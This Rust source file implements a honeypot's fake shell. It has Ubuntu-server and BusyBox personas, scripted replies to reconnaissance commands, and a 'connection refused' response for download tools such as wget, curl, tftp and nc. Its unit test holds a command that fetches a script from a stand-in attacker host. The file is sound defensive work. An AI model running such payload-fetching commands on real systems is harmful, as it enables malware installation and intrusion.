/// Canned shell. Never executes host commands, never fetches URLs.
#[derive(Clone, Copy)]
pub enum Persona {
    /// StingBox-style "unsecured Linux server"
    Ubuntu,
    /// IoT camera/router
    BusyBox,
}

pub fn prompt(persona: Persona) -> &'static [u8] {
    match persona {
        Persona::Ubuntu => b"root@FILESERVER:~# ",
        Persona::BusyBox => b"# ",
    }
}

pub fn motd(persona: Persona) -> &'static [u8] {
    match persona {
        Persona::Ubuntu => {
            b"Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)\r\n\r\n"
        }
        Persona::BusyBox => {
            b"\r\nBusyBox v1.36.1 (2023-11-07 18:26:41 UTC) built-in shell (ash)\r\nEnter 'help' for a list of built-in commands.\r\n\r\n"
        }
    }
}

pub fn reply(persona: Persona, cmd: &str) -> String {
    let cmd_lower = cmd.to_ascii_lowercase();
    let base = cmd_lower.split_whitespace().next().unwrap_or("");
    match base {
        "ls" => match persona {
            Persona::Ubuntu => "Desktop  Documents  Downloads  share  backups\r\n".into(),
            Persona::BusyBox => "bin  dev  etc  home  proc  tmp  usr  var\r\n".into(),
        },
        "pwd" => match persona {
            Persona::Ubuntu => "/root\r\n".into(),
            Persona::BusyBox => "/root\r\n".into(),
        },
        "whoami" => "root\r\n".into(),
        "id" => "uid=0(root) gid=0(root) groups=0(root)\r\n".into(),
        "hostname" => "FILESERVER\r\n".into(),
        "cat" => "cat: permission denied\r\n".into(),
        "uname" => match persona {
            Persona::Ubuntu => {
                "Linux FILESERVER 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux\r\n".into()
            }
            Persona::BusyBox => {
                "Linux router 2.6.36 #1 SMP PREEMPT Fri Mar 14 11:26:04 CST 2014 mips unknown\r\n"
                    .into()
            }
        },
        "ifconfig" | "ip" => {
            "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\r\n        inet 192.168.1.50  netmask 255.255.255.0  broadcast 192.168.1.255\r\n".into()
        }
        "ps" => "  PID TTY          TIME CMD\r\n    1 ?        00:00:01 systemd\r\n  412 ?        00:00:00 sshd\r\n  880 ?        00:00:00 smbd\r\n".into(),
        "help" => "Built-in commands:\r\nls pwd whoami id uname hostname ifconfig ps cat\r\n".into(),
        "wget" | "curl" | "tftp" | "nc" | "busybox" | "apt" | "apt-get" | "yum" => {
            "Download failed: connection refused\r\n".into()
        }
        "" => String::new(),
        _ => format!("{base}: command not found\r\n"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn wget_never_succeeds() {
        let r = reply(Persona::Ubuntu, "wget http://evil.example/x.sh");
        assert!(r.contains("refused"));
    }
}
